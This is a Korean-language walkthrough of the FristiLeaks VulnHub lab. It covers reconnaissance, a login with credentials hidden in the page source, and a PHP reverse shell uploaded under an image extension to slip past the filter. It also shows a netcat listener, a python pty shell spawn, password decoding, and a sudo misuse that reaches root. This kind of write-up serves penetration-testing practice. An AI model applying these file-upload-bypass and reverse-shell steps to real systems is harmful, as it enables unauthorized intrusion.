# FristiLeaks

## Workstation
- VirtualBox : Vmware Workstation
- OS : kali-linux-2024.01

## Walkthrough
[https://www.vulnhub.com/entry/fristileaks-13,133/](https://www.vulnhub.com/entry/fristileaks-13,133/)

FristiLeaks 가상머신은 위 사이트에서 다운받을 수 있다.

가상머신을 다운받은 후 Vmware에 열어보면 네트워크 이슈로 인해 정상 접속이 되지 않았다.

![fristileaks]()

해당 이슈 해결을 위해 사이트에서 설명을 읽어보면 VM의 MAC 주소를 `08:00:27:A5:A6:76`로 변경하라고 되어있다.

![description]()

MAC 주소를 변경하기 위해 가상머신을 종료 후 설정에 들어가 `Network Adapter`에서 `advanced`를 들어가면 MAC 주소를 변경할 수 있다.

MAC 주소를 변경 후 재시작 하면 아래와 같이 정상 접속이 된 것을 확인할 수 있다.

![mac]()

위 사진에서 IP 주소를 나타내고 있다.

이제 칼리리눅스로 돌아가 위 IP 주소를 `nmap`을 사용하여 열려있는 포트와 버전을 알아냈다.

![nmap]()

80번 포트에 http 서버가 열려있다. `FireFox`에서 해당 IP 주소와 열려있던 80번 포트를 검색한다.

![firefox]()

사이트에선 알아낼 수 있는 것이 아무것도 없기에 `gobuster`를 사용하여 디렉토리를 확인한다.

![gobuster]()

또한 nikto를 사용하여 해당 사이트의 취약점이 있는지 알아본다.

![nikto]()

nikto를 확인하면 `/robots.txt` 파일에서 `/beer/`, `/sisi/`, `/cola/` 디렉터리를 확인할 수 있다. 각각 확인해 보면 다 같은 이미지를 보여주고 있다.

![beer]()

![sisi]()

![cola]()

도저히 알아낼 방법이 없어 다른 사람의 walkthrough를 확인하여 힌트를 얻었다.

fristi 디렉터리를 확인하면 아래와 같이 로그인 페이지가 나온다.

![fristi]()

우선 페이지 소스를 보면 사용자의 이름이 추정되는 `eezeepz`가 보이며 base64로 인코딩된 이미지가 있음을 알 수 있다.

![source]()

또한 아래로 내려보면 base64로 보이는 코드가 있다.

![code]()

구글에 base64 image decoder를 치면 https://codebeautify.org/base64-to-image-converter 사이트가 나온다. 이 사이트에서 base64 코드를 입력하면 패스워드로 보이는 글자 `keKkeKKeKKeKkEkkEk` 가 나왔다. 

![decode]()

이제 `eezeepz`와 `keKkeKKeKKeKkEkkEk`를 입력하여 로그인한다. 

![login]()

로그인에 성공하여 아래와 같이 업로드 할 수 있는 사이트도 나왔다.

![successful]()

파일을 업로드 할 수 있으므로 php 리버스쉘을 사용하여 권한을 얻는다.

리버스쉘에서 IP주소와 포트번호를 변경한다.

![cp]()

![nano]()

이제 변경한 파일을 업로드한다.

![uploadfile]()

업로드에 실패했다. 업로드하기 위해선 `png`, `jpg`, `gif` 확장자만 업로드를 허용하고 있다고 한다.

그럼 php 파일의 확장자를 변경하여 업로드한다.

![mv]()

아래와 같이 업로드가 성공되어 /uploads에 저장되었다.

그럼 리버스쉘을 실행시키기 위해 새로운 터미널을 열어 아까 리버스쉘에서 지정한 포트 4444번을 `nc`를 사용하여 리스닝한다.

```
nc -lvnp 4444
```

그리고 업로드한 리버스쉘 파일을 실행시킨다.

```
192.168.159.130/fristi/uploads/php-reverse-shell.php.png
```

아까 리스닝하고 있던 터미널에서 쉘을 얻을 수 있다.

![shell]()

bash 쉘을 얻기 위해 파이썬 코드를 다음과 같이 입력한다.

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![bash]()

이제 home 디렉토리를 확인한다.

```
bash-4.1$ ls -al
ls -al
total 102
dr-xr-xr-x.  22 root root  4096 Mar  8 08:20 .
dr-xr-xr-x.  22 root root  4096 Mar  8 08:20 ..
-rw-r--r--    1 root root     0 Mar  8 08:20 .autofsck
-rw-r--r--    1 root root     0 Nov 17  2015 .autorelabel
dr-xr-xr-x.   2 root root  4096 Nov 17  2015 bin
dr-xr-xr-x.   5 root root  1024 Nov 17  2015 boot
drwxr-xr-x   18 root root  3680 Mar  8 08:20 dev
drwxr-xr-x.  70 root root  4096 Mar  8 08:20 etc
drwxr-xr-x.   5 root root  4096 Nov 19  2015 home
dr-xr-xr-x.   8 root root  4096 Nov 17  2015 lib
dr-xr-xr-x.   9 root root 12288 Nov 17  2015 lib64
drwx------.   2 root root 16384 Nov 17  2015 lost+found
drwxr-xr-x.   2 root root  4096 Sep 23  2011 media
drwxr-xr-x.   3 root root  4096 Nov 17  2015 mnt
drwxr-xr-x.   3 root root  4096 Nov 17  2015 opt
dr-xr-xr-x  123 root root     0 Mar  8 08:20 proc
dr-xr-x---.   3 root root  4096 Nov 25  2015 root
dr-xr-xr-x.   2 root root 12288 Nov 18  2015 sbin
drwxr-xr-x.   2 root root  4096 Nov 17  2015 selinux
drwxr-xr-x.   2 root root  4096 Sep 23  2011 srv
drwxr-xr-x   13 root root     0 Mar  8 08:20 sys
drwxrwxrwt.   3 root root  4096 Mar  8 09:12 tmp
drwxr-xr-x.  13 root root  4096 Nov 17  2015 usr
drwxr-xr-x.  19 root root  4096 Nov 19  2015 var
bash-4.1$ cd home
cd home
bash-4.1$ ls -al
ls -al
total 28
drwxr-xr-x.  5 root      root       4096 Nov 19  2015 .
dr-xr-xr-x. 22 root      root       4096 Mar  8 08:20 ..
drwx------.  2 admin     admin      4096 Nov 19  2015 admin
drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz
drwx------   2 fristigod fristigod  4096 Nov 19  2015 fristigod
bash-4.1$ cd eezeepz
cd eezeepz
bash-4.1$ ls -al
ls -al
total 2608
drwx---r-x. 5 eezeepz eezeepz  12288 Nov 18  2015 .
drwxr-xr-x. 5 root    root      4096 Nov 19  2015 ..
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .Old
-rw-r--r--. 1 eezeepz eezeepz     18 Sep 22  2015 .bash_logout
-rw-r--r--. 1 eezeepz eezeepz    176 Sep 22  2015 .bash_profile
-rw-r--r--. 1 eezeepz eezeepz    124 Sep 22  2015 .bashrc
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .gnome
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .settings
-rwxr-xr-x. 1 eezeepz eezeepz  24376 Nov 17  2015 MAKEDEV
-rwxr-xr-x. 1 eezeepz eezeepz  33559 Nov 17  2015 cbq
-rwxr-xr-x. 1 eezeepz eezeepz   6976 Nov 17  2015 cciss_id
-rwxr-xr-x. 1 eezeepz eezeepz  56720 Nov 17  2015 cfdisk
-rwxr-xr-x. 1 eezeepz eezeepz  25072 Nov 17  2015 chcpu
-rwxr-xr-x. 1 eezeepz eezeepz  52936 Nov 17  2015 chgrp
-rwxr-xr-x. 1 eezeepz eezeepz  31800 Nov 17  2015 chkconfig
-rwxr-xr-x. 1 eezeepz eezeepz  48712 Nov 17  2015 chmod
-rwxr-xr-x. 1 eezeepz eezeepz  53640 Nov 17  2015 chown
-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 clock
-rwxr-xr-x. 1 eezeepz eezeepz   4808 Nov 17  2015 consoletype
-rwxr-xr-x. 1 eezeepz eezeepz 129992 Nov 17  2015 cpio
-rwxr-xr-x. 1 eezeepz eezeepz  38608 Nov 17  2015 cryptsetup
-rwxr-xr-x. 1 eezeepz eezeepz   5344 Nov 17  2015 ctrlaltdel
-rwxr-xr-x. 1 eezeepz eezeepz  41704 Nov 17  2015 cut
-rwxr-xr-x. 1 eezeepz eezeepz  14832 Nov 17  2015 halt
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 hostname
-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 hwclock
-rwxr-xr-x. 1 eezeepz eezeepz   7920 Nov 17  2015 kbd_mode
-rwxr-xr-x. 1 eezeepz eezeepz  11576 Nov 17  2015 kill
-rwxr-xr-x. 1 eezeepz eezeepz  16472 Nov 17  2015 killall5
-rwxr-xr-x. 1 eezeepz eezeepz  32928 Nov 17  2015 kpartx
-rwxr-xr-x. 1 eezeepz eezeepz  11464 Nov 17  2015 nameif
-rwxr-xr-x. 1 eezeepz eezeepz 171784 Nov 17  2015 nano
-rwxr-xr-x. 1 eezeepz eezeepz   5512 Nov 17  2015 netreport
-rwxr-xr-x. 1 eezeepz eezeepz 123360 Nov 17  2015 netstat
-rwxr-xr-x. 1 eezeepz eezeepz  13892 Nov 17  2015 new-kernel-pkg
-rwxr-xr-x. 1 eezeepz eezeepz  25208 Nov 17  2015 nice
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 nisdomainname
-rwxr-xr-x. 1 eezeepz eezeepz   4736 Nov 17  2015 nologin
-r--r--r--. 1 eezeepz eezeepz    514 Nov 18  2015 notes.txt
-rwxr-xr-x. 1 eezeepz eezeepz 390616 Nov 17  2015 tar
-rwxr-xr-x. 1 eezeepz eezeepz  11352 Nov 17  2015 taskset
-rwxr-xr-x. 1 eezeepz eezeepz 249000 Nov 17  2015 tc
-rwxr-xr-x. 1 eezeepz eezeepz  51536 Nov 17  2015 telinit
-rwxr-xr-x. 1 eezeepz eezeepz  47928 Nov 17  2015 touch
-rwxr-xr-x. 1 eezeepz eezeepz  11440 Nov 17  2015 tracepath
-rwxr-xr-x. 1 eezeepz eezeepz  12304 Nov 17  2015 tracepath6
-rwxr-xr-x. 1 eezeepz eezeepz  21112 Nov 17  2015 true
-rwxr-xr-x. 1 eezeepz eezeepz  35608 Nov 17  2015 tune2fs
-rwxr-xr-x. 1 eezeepz eezeepz  15410 Nov 17  2015 weak-modules
-rwxr-xr-x. 1 eezeepz eezeepz  12216 Nov 17  2015 wipefs
-rwxr-xr-x. 1 eezeepz eezeepz 504400 Nov 17  2015 xfs_repair
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 ypdomainname
-rwxr-xr-x. 1 eezeepz eezeepz     62 Nov 17  2015 zcat
-rwxr-xr-x. 1 eezeepz eezeepz  47520 Nov 17  2015 zic
```

`notes.txt` 텍스트파일이 있으니 확인한다.

![notes]()

`/home/admin` 아래에 있는 모든 명령어 중 `chmod` 명령어를 `/tmp/runthis` 파일에 전체 경로를 입력하여 실행하면 된다.

![echo]()

이제 `/home/admin` 폴더로 이동한다. 파이썬 파일과 텍스트 파일들이 보인다.

![admin]()

모두 내용을 확인한다.

```
bash-4.1$ cat cronjob.py
cat cronjob.py
import os

def writefile(str):
    with open('/tmp/cronresult','a') as er:
        er.write(str)
        er.close()

with open('/tmp/runthis','r') as f:
    for line in f:
        #does the command start with /home/admin or /usr/bin?
        if line.startswith('/home/admin/') or line.startswith('/usr/bin/'):
            #lets check for pipeline
            checkparams= '|&;'
            if checkparams in line:
                writefile("Sorry, not allowed to use |, & or ;")
                exit(1)
            else:
                writefile("executing: "+line)
                result =os.popen(line).read()
                writefile(result)
        else:
            writefile("command did not start with /home/admin or /usr/bin")
bash-4.1$ cat cryptedpass.txt
cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq
bash-4.1$ cat cryptpass.py
cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
bash-4.1$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
```

`cryptpass.py` 파일은 base64 코드를 인코딩하는 파일이고 텍스트 파일은 base64로 인코딩된 파일같다.

그럼 인코딩된 코드를 해독한다.

![python]()

위와 같은 방법으로 `thisisalsopw123`과 `LetThereBeFristi!`를 얻었다. 사용자의 패스워드 같다.

그럼 위 두개의 패스워드로 fristigod 사용자로 로그인한다. 패스워드는 `LetThereBeFristi!`이다.

![fristigod]()

이제 sudo 명령어로 사용가능한 리스트를 확인한다.

![sudo]()

`fristi` 사용자 명령어로  `docom` 파일을 사용가능하다고 나온다. 우선 파일이 있는 디렉토리로 이동한다.

그리고 파일을 실행해 보면 사용자가 달라 실행할 수 없다고 나온다.

![doCom]()

사용자를 `fristi`로 지정하여 실행해도 실행되지 않고 사용방법을 알려준다. 뒤에 터미널 커맨드를 추가로 입력하라고 한다.

![root]()

`root` 권한을 얻었다.

이제 `/root` 디렉터리로 이동하여 플래그를 찾는다.

![flag]()
